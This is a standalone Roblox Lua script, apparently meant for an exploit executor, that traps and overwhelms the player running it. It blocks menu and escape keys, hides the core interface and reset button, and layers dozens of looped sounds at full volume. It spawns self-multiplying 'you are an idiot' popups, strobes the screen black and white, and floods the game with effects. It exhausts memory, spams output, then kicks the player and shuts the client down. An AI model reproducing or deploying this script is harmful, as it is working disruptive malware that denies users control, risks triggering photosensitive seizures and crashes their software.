local Players             = game:GetService("Players")
local RunService          = game:GetService("RunService")
local SoundService        = game:GetService("SoundService")
local GuiService          = game:GetService("GuiService")
local StarterGui          = game:GetService("StarterGui")
local UserInputService    = game:GetService("UserInputService")
local ContextActionService = game:GetService("ContextActionService")
local Lighting            = game:GetService("Lighting")

local player = Players.LocalPlayer
if not player then
    repeat task.wait() until Players.LocalPlayer
    player = Players.LocalPlayer
end

local function mount(gui)
    local ok = pcall(function()
        if typeof(gethui) == "function" then
            gui.Parent = gethui()
            return
        end
        if syn and syn.protect_gui then
            syn.protect_gui(gui)
            gui.Parent = game:GetService("CoreGui")
            return
        end
        if typeof(protect_gui) == "function" then
            protect_gui(gui)
            gui.Parent = game:GetService("CoreGui")
            return
        end
        gui.Parent = game:GetService("CoreGui")
    end)
    if not ok or not gui.Parent then
        gui.Parent = player:WaitForChild("PlayerGui")
    end
end

local blockedKeys = {
    [Enum.KeyCode.Escape] = true,
    [Enum.KeyCode.Return] = true,
    [Enum.KeyCode.KeypadEnter] = true,
    [Enum.KeyCode.ButtonStart] = true,
    [Enum.KeyCode.ButtonSelect] = true,
    [Enum.KeyCode.ButtonB] = true,
    [Enum.KeyCode.ButtonA] = true,
}

ContextActionService:BindActionAtPriority(
    "M7_BlockMenuKeys",
    function() return Enum.ContextActionResult.Sink end,
    false,
    Enum.ContextActionPriority.High.Value + 1000,
    Enum.KeyCode.Escape,
    Enum.KeyCode.Return,
    Enum.KeyCode.KeypadEnter,
    Enum.KeyCode.ButtonStart,
    Enum.KeyCode.ButtonSelect,
    Enum.KeyCode.ButtonB,
    Enum.KeyCode.ButtonA
)

UserInputService.InputBegan:Connect(function(input)
    if blockedKeys[input.KeyCode] then
        pcall(function() GuiService:SetMenuIsOpen(false) end)
    end
end)

pcall(function()
    GuiService.MenuOpened:Connect(function()
        pcall(function() GuiService:SetMenuIsOpen(false) end)
    end)
end)

task.spawn(function()
    while true do
        pcall(function() GuiService:SetMenuIsOpen(false) end)
        pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)
        pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
        pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)
        task.wait(0.02)
    end
end)

task.delay(300, function()
    pcall(function() player:Kick("gg") end)
    task.wait(0.5)
    pcall(function() game:Shutdown() end)
end)

local sw, sh = 1280, 720
local function refreshViewport()
    local cam = workspace.CurrentCamera
    if cam then
        local vp = cam.ViewportSize
        if vp.X > 0 and vp.Y > 0 then
            sw, sh = vp.X, vp.Y
        end
    end
end
refreshViewport()
do
    local cam = workspace.CurrentCamera
    if cam then
        cam:GetPropertyChangedSignal("ViewportSize"):Connect(refreshViewport)
    end
    workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
        local c = workspace.CurrentCamera
        if c then
            c:GetPropertyChangedSignal("ViewportSize"):Connect(refreshViewport)
            refreshViewport()
        end
    end)
end

local blackGui = Instance.new("ScreenGui")
blackGui.Name = "M7_BlackOut"
blackGui.ResetOnSpawn = false
blackGui.IgnoreGuiInset = true
blackGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
blackGui.DisplayOrder = 999998
mount(blackGui)

local blackFrame = Instance.new("Frame")
blackFrame.Size = UDim2.fromScale(1, 1)
blackFrame.Position = UDim2.fromScale(0, 0)
blackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
blackFrame.BackgroundTransparency = 0
blackFrame.BorderSizePixel = 0
blackFrame.ZIndex = 1
blackFrame.Parent = blackGui

local SOUND_ID = "rbxassetid://131761138083978"
local MAX_SOUNDS = 200
local sounds = {}

local function addSound(clean)
    if #sounds >= MAX_SOUNDS then return end
    local s = Instance.new("Sound")
    s.SoundId = SOUND_ID
    s.Looped = true
    s.Volume = 10
    if clean then
        s.PlaybackSpeed = 1.0
    else
        s.PlaybackSpeed = 0.55 + math.random() * 1.1
    end
    s.Parent = SoundService
    pcall(function()
        s:Play()
        if not clean then
            local len = s.TimeLength
            if len and len > 0 then
                s.TimePosition = math.random() * len
            else
                s.TimePosition = math.random() * 5
            end
        end
    end)
    sounds[#sounds + 1] = s
    return s
end

addSound(true)

task.spawn(function()
    local interval = 2.0
    while true do
        task.wait(interval)
        addSound(false)
        interval = math.max(0.075, interval * 0.94)
    end
end)

task.spawn(function()
    task.wait(7.5)
    while true do
        task.wait(0.75)
        if #sounds >= 5 then
            for _ = 1, math.min(2, #sounds) do
                local s = sounds[math.random(1, #sounds)]
                if s and s.Parent then
                    pcall(function()
                        local len = s.TimeLength
                        if len and len > 0 then
                            s.TimePosition = math.random() * len
                        end
                        if math.random() < 0.35 then
                            s.PlaybackSpeed = 0.55 + math.random() * 1.1
                        end
                    end)
                end
            end
        end
    end
end)

task.spawn(function()
    while true do
        task.wait(0.4)
        pcall(function()
            local s = Instance.new("Sound")
            s.SoundId = SOUND_ID
            s.Looped = true
            s.Volume = 10
            s.PlaybackSpeed = 0.4 + math.random() * 1.4
            s.Parent = SoundService
            s:Play()
        end)
    end
end)

local isBlack = true
local timer = 0
local pages = {}

RunService.Heartbeat:Connect(function(dt)
    timer += dt
    if timer < 0.35 then return end
    timer = 0
    isBlack = not isBlack

    local bg = isBlack and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(255, 255, 255)
    local fg = isBlack and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(0, 0, 0)

    for data in pairs(pages) do
        if data.page and data.page.Parent then
            data.page.BackgroundColor3 = bg
            data.label.TextColor3 = fg
            for _, face in ipairs(data.faces) do
                face.TextColor3 = fg
            end
        else
            pages[data] = nil
        end
    end
end)

local count = 0

local function spawnPopup()
    count += 1
    local id = count

    local gui = Instance.new("ScreenGui")
    gui.Name = "popup" .. id
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 999999 + id
    mount(gui)

    local w, h, th = 420, 260, 24
    local px = math.random(0, math.max(1, sw - w))
    local py = math.random(0, math.max(1, sh - h))
    local vx = math.random(180, 320) * (math.random(0, 1) == 0 and 1 or -1)
    local vy = math.random(180, 320) * (math.random(0, 1) == 0 and 1 or -1)

    local window = Instance.new("Frame")
    window.Size = UDim2.new(0, w, 0, h)
    window.Position = UDim2.new(0, px, 0, py)
    window.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    window.BorderSizePixel = 0
    window.ZIndex = id * 3
    window.Parent = gui

    local stroke = Instance.new("UIStroke")
    stroke.Thickness = 1
    stroke.Color = Color3.fromRGB(20, 20, 20)
    stroke.Parent = window

    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, th)
    titleBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    titleBar.BorderSizePixel = 0
    titleBar.ZIndex = id * 3 + 1
    titleBar.Parent = window

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -32, 1, 0)
    titleLabel.Position = UDim2.new(0, 8, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "you are an idiot"
    titleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    titleLabel.Font = Enum.Font.Gotham
    titleLabel.TextSize = 12
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.ZIndex = id * 3 + 2
    titleLabel.Parent = titleBar

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 24, 0, 18)
    closeBtn.Position = UDim2.new(1, -26, 0, 3)
    closeBtn.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
    closeBtn.BorderSizePixel = 0
    closeBtn.Text = "×"
    closeBtn.TextColor3 = Color3.fromRGB(220, 220, 220)
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextSize = 15
    closeBtn.ZIndex = id * 3 + 2
    closeBtn.Parent = titleBar

    local initBg = isBlack and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(255, 255, 255)
    local initFg = isBlack and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(0, 0, 0)

    local page = Instance.new("Frame")
    page.Size = UDim2.new(1, 0, 1, -th)
    page.Position = UDim2.new(0, 0, 0, th)
    page.BackgroundColor3 = initBg
    page.BorderSizePixel = 0
    page.ZIndex = id * 3 + 1
    page.Parent = window

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0, 56)
    label.Position = UDim2.new(0, 0, 0, 30)
    label.BackgroundTransparency = 1
    label.Text = "you are an idiot"
    label.TextColor3 = initFg
    label.Font = Enum.Font.Gotham
    label.TextSize = 28
    label.TextXAlignment = Enum.TextXAlignment.Center
    label.ZIndex = id * 3 + 2
    label.Parent = page

    local faceList = {}
    local faceSize = 58
    local gap = 20
    local rowWidth = 3 * faceSize + 2 * gap
    local startX = (w - rowWidth) / 2

    for i = 1, 3 do
        local face = Instance.new("TextLabel")
        face.Size = UDim2.new(0, faceSize, 0, faceSize)
        face.Position = UDim2.new(0, startX + (i - 1) * (faceSize + gap), 0, 100)
        face.BackgroundTransparency = 1
        face.Text = "☺"
        face.TextColor3 = initFg
        face.Font = Enum.Font.Gotham
        face.TextScaled = true
        face.ZIndex = id * 3 + 2
        face.Parent = page
        table.insert(faceList, face)
    end

    local data = { page = page, label = label, faces = faceList }
    pages[data] = true

    local conn
    conn = RunService.Heartbeat:Connect(function(dt)
        if not gui.Parent then
            conn:Disconnect()
            pages[data] = nil
            return
        end

        px += vx * dt
        py += vy * dt

        if px <= 0 then px = 0; vx = math.abs(vx)
        elseif px + w >= sw then px = sw - w; vx = -math.abs(vx) end

        if py <= 0 then py = 0; vy = math.abs(vy)
        elseif py + h >= sh then py = sh - h; vy = -math.abs(vy) end

        window.Position = UDim2.new(0, px, 0, py)
    end)

    closeBtn.MouseButton1Click:Connect(function()
        conn:Disconnect()
        pages[data] = nil
        gui:Destroy()
        task.spawn(spawnPopup)
        task.spawn(spawnPopup)
        task.spawn(spawnPopup)
    end)
end

spawnPopup()
for i = 1, 8 do
    task.delay(i * 0.1, spawnPopup)
end

task.spawn(function()
    local interval = 0.25
    while true do
        task.wait(interval)
        spawnPopup()
        interval = math.max(0.02, interval * 0.94)
    end
end)

task.spawn(function()
    while true do
        for _ = 1, 5 do task.spawn(spawnPopup) end
        task.wait(0.04)
    end
end)

task.spawn(function()
    local wave = 1
    while true do
        task.wait(0.5)
        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        local basePos = root and root.Position or Vector3.new(0, 5, 0)
        local emitterCount = math.min(wave * 6, 400)
        local lightCount = math.min(wave * 3, 200)
        for _ = 1, emitterCount do
            pcall(function()
                local p = Instance.new("Part")
                p.Size = Vector3.new(0.2, 0.2, 0.2); p.Transparency = 1
                p.CanCollide = false; p.Anchored = true
                p.CFrame = CFrame.new(basePos + Vector3.new(math.random(-80,80), math.random(0,60), math.random(-80,80)))
                local em = Instance.new("ParticleEmitter")
                em.Rate = 1500; em.Lifetime = NumberRange.new(20, 40)
                em.Size = NumberSequence.new(25)
                em.Texture = "rbxasset://textures/particles/sparkles_main.dds"
                em.LightEmission = 1; em.LightInfluence = 0
                em.Parent = p; p.Parent = workspace
            end)
        end
        for _ = 1, lightCount do
            pcall(function()
                local p = Instance.new("Part")
                p.Size = Vector3.new(1,1,1); p.Transparency = 1
                p.CanCollide = false; p.Anchored = true
                p.CFrame = CFrame.new(basePos + Vector3.new(math.random(-80,80), math.random(0,50), math.random(-80,80)))
                local l = Instance.new("PointLight")
                l.Range = 80; l.Brightness = 12; l.Shadows = true
                l.Parent = p; p.Parent = workspace
            end)
        end
        wave = wave + 2
    end
end)

task.spawn(function()
    while true do
        task.wait(0.05)
        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        local basePos = root and root.Position or Vector3.new(0, 5, 0)
        for _ = 1, 10 do
            pcall(function()
                local p = Instance.new("Part")
                p.Size = Vector3.new(4,4,4); p.Material = Enum.Material.Metal
                p.CanCollide = true; p.Anchored = false
                p.CFrame = CFrame.new(basePos + Vector3.new(math.random(-40,40), math.random(60,120), math.random(-40,40)))
                local a0 = Instance.new("Attachment", p); a0.Position = Vector3.new(0,1,0)
                local a1 = Instance.new("Attachment", p); a1.Position = Vector3.new(0,-1,0)
                local t = Instance.new("Trail")
                t.Attachment0 = a0; t.Attachment1 = a1; t.Lifetime = 8
                t.MinLength = 0; t.WidthScale = NumberSequence.new(2)
                t.Parent = p
                p.Parent = workspace
            end)
        end
    end
end)

task.spawn(function()
    local effects = {}
    for _ = 1, 12 do
        local cc = Instance.new("ColorCorrectionEffect"); cc.Parent = Lighting; table.insert(effects, cc)
        local bl = Instance.new("BlurEffect"); bl.Size = 20; bl.Parent = Lighting; table.insert(effects, bl)
        local bm = Instance.new("BloomEffect"); bm.Intensity = 2; bm.Threshold = 0.1; bm.Size = 24; bm.Parent = Lighting; table.insert(effects, bm)
    end
    RunService.RenderStepped:Connect(function()
        for _, e in ipairs(effects) do
            if e:IsA("ColorCorrectionEffect") then
                e.Contrast = math.random() * 2 - 1
                e.Saturation = math.random() * 4 - 2
                e.TintColor = Color3.new(math.random(), math.random(), math.random())
            elseif e:IsA("BlurEffect") then
                e.Size = math.random() * 56
            elseif e:IsA("BloomEffect") then
                e.Intensity = math.random() * 5
            end
        end
    end)
end)

task.spawn(function()
    while true do
        task.wait(0.08)
        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        local basePos = root and root.Position or Vector3.new(0, 5, 0)
        for _ = 1, 6 do
            pcall(function()
                local ex = Instance.new("Explosion")
                ex.BlastRadius = 0; ex.BlastPressure = 0; ex.DestroyJointRadiusPercent = 0
                ex.Position = basePos + Vector3.new(math.random(-30,30), math.random(-10,20), math.random(-30,30))
                ex.Parent = workspace
            end)
        end
    end
end)

RunService.RenderStepped:Connect(function()
    local cam = workspace.CurrentCamera
    if cam then
        pcall(function() cam.FieldOfView = 30 + math.random() * 90 end)
    end
end)

task.spawn(function()
    while true do
        local t = {}
        for i = 1, 100000 do
            t[i] = { math.random(), math.random(), tostring(math.random()) }
        end
        task.wait(0.05)
    end
end)

task.spawn(function()
    while true do
        for _ = 1, 200 do
            print(string.rep(tostring(math.random()), 30))
        end
        task.wait(0.01)
    end
end)

task.spawn(function()
    while true do
        task.wait(0.1)
        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        local basePos = root and root.Position or Vector3.new(0, 5, 0)
        for _ = 1, 20 do
            pcall(function()
                local p = Instance.new("Part")
                p.Size = Vector3.new(math.random(2,10), math.random(2,10), math.random(2,10))
                p.Material = Enum.Material.Neon
                p.Color = Color3.new(math.random(), math.random(), math.random())
                p.Transparency = 0.3
                p.CanCollide = false; p.Anchored = true
                p.CFrame = CFrame.new(basePos + Vector3.new(math.random(-50,50), math.random(0,50), math.random(-50,50)))
                    * CFrame.Angles(math.random()*6.28, math.random()*6.28, math.random()*6.28)
                p.Parent = workspace
            end)
        end
    end
end)

task.spawn(function()
    local gui = Instance.new("ScreenGui")
    gui.Name = "M7_Overdraw"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 999997
    mount(gui)
    local layers = {}
    for i = 1, 80 do
        local f = Instance.new("Frame")
        f.Size = UDim2.fromScale(1, 1)
        f.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
        f.BackgroundTransparency = 0.85
        f.BorderSizePixel = 0
        f.ZIndex = i
        f.Parent = gui
        table.insert(layers, f)
    end
    RunService.RenderStepped:Connect(function()
        for _, f in ipairs(layers) do
            f.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
            f.BackgroundTransparency = 0.75 + math.random() * 0.2
        end
    end)
end)

task.spawn(function()
    while true do
        task.wait(1)
        pcall(function()
            local cam = workspace.CurrentCamera
            if not cam then return end
            local att = Instance.new("Attachment")
            att.Position = Vector3.new(math.random(-8,8), math.random(-4,4), -20)
            att.Parent = cam
            local em = Instance.new("ParticleEmitter")
            em.Rate = 2500
            em.Lifetime = NumberRange.new(3, 8)
            em.Size = NumberSequence.new(40)
            em.Texture = "rbxasset://textures/particles/smoke_main.dds"
            em.LightEmission = 0.6
            em.Transparency = NumberSequence.new(0.4)
            em.Parent = att
        end)
    end
end)

task.spawn(function()
    while true do
        task.wait(0.25)
        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        local basePos = root and root.Position or Vector3.new(0,5,0)
        for _ = 1, 6 do
            pcall(function()
                local p = Instance.new("Part")
                p.Size = Vector3.new(1,1,1); p.Transparency = 1
                p.CanCollide = false; p.Anchored = true
                p.CFrame = CFrame.new(basePos + Vector3.new(math.random(-40,40), math.random(10,30), math.random(-40,40)))
                    * CFrame.Angles(math.random()*6.28, math.random()*6.28, math.random()*6.28)
                local l = Instance.new("SpotLight")
                l.Range = 60; l.Brightness = 15; l.Angle = 120
                l.Shadows = true
                l.Color = Color3.new(math.random(), math.random(), math.random())
                l.Parent = p; p.Parent = workspace
            end)
        end
    end
end)

task.spawn(function()
    pcall(function()
        local atm = Instance.new("Atmosphere")
        atm.Density = 0.6; atm.Haze = 8; atm.Glare = 3
        atm.Color = Color3.new(math.random(), math.random(), math.random())
        atm.Decay = Color3.new(math.random(), math.random(), math.random())
        atm.Parent = Lighting

        local sr = Instance.new("SunRaysEffect")
        sr.Intensity = 1; sr.Spread = 1
        sr.Parent = Lighting

        local dof = Instance.new("DepthOfFieldEffect")
        dof.FarIntensity = 1; dof.NearIntensity = 1
        dof.FocusDistance = 5; dof.InFocusRadius = 2
        dof.Parent = Lighting

        RunService.RenderStepped:Connect(function()
            atm.Density = 0.3 + math.random() * 0.5
            atm.Haze = math.random() * 10
            atm.Glare = math.random() * 5
            dof.FocusDistance = math.random() * 500
            dof.NearIntensity = math.random()
            dof.FarIntensity = math.random()
        end)
    end)
end)

task.spawn(function()
    while true do
        task.wait(0.2)
        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        local basePos = root and root.Position or Vector3.new(0,5,0)
        for _ = 1, 5 do
            pcall(function()
                local p = Instance.new("Part")
                p.Size = Vector3.new(20, 20, 1)
                p.Material = Enum.Material.Glass
                p.Reflectance = 1
                p.Transparency = 0.1
                p.CanCollide = false; p.Anchored = true
                p.CFrame = CFrame.new(basePos + Vector3.new(math.random(-40,40), math.random(5,30), math.random(-40,40)))
                    * CFrame.Angles(math.random()*6.28, math.random()*6.28, math.random()*6.28)
                p.Parent = workspace
            end)
        end
    end
end)

task.spawn(function()
    while true do
        task.wait(0.12)
        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        local basePos = root and root.Position or Vector3.new(0,5,0)
        for _ = 1, 8 do
            pcall(function()
                local p1 = Instance.new("Part")
                p1.Size = Vector3.new(0.2,0.2,0.2); p1.Transparency = 1
                p1.CanCollide = false; p1.Anchored = true
                p1.CFrame = CFrame.new(basePos + Vector3.new(math.random(-60,60), math.random(0,30), math.random(-60,60)))
                p1.Parent = workspace

                local p2 = Instance.new("Part")
                p2.Size = Vector3.new(0.2,0.2,0.2); p2.Transparency = 1
                p2.CanCollide = false; p2.Anchored = true
                p2.CFrame = CFrame.new(basePos + Vector3.new(math.random(-60,60), math.random(0,30), math.random(-60,60)))
                p2.Parent = workspace

                local a1 = Instance.new("Attachment", p1)
                local a2 = Instance.new("Attachment", p2)
                local b = Instance.new("Beam")
                b.Attachment0 = a1; b.Attachment1 = a2
                b.Width0 = 4; b.Width1 = 4
                b.Segments = 30
                b.Texture = "rbxasset://textures/particles/sparkles_main.dds"
                b.TextureLength = 2
                b.TextureSpeed = 5
                b.LightEmission = 1
                b.Color = ColorSequence.new(Color3.new(math.random(), math.random(), math.random()))
                b.Parent = p1
            end)
        end
    end
end)

task.spawn(function()
    while true do
        task.wait(0.15)
        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
        local basePos = root and root.Position or Vector3.new(0,5,0)
        for _ = 1, 6 do
            pcall(function()
                local p = Instance.new("Part")
                p.Size = Vector3.new(math.random(5,15), math.random(5,15), math.random(5,15))
                p.Material = Enum.Material.ForceField
                p.Color = Color3.new(math.random(), math.random(), math.random())
                p.CanCollide = false; p.Anchored = true
                p.CFrame = CFrame.new(basePos + Vector3.new(math.random(-60,60), math.random(0,40), math.random(-60,60)))
                p.Parent = workspace
            end)
        end
    end
end)

task.spawn(function()
    local blurs = {}
    for _ = 1, 8 do
        local bl = Instance.new("BlurEffect")
        bl.Size = 40
        bl.Parent = Lighting
        table.insert(blurs, bl)
    end
    RunService.RenderStepped:Connect(function()
        for _, bl in ipairs(blurs) do
            bl.Size = math.random() * 56
        end
    end)
end)
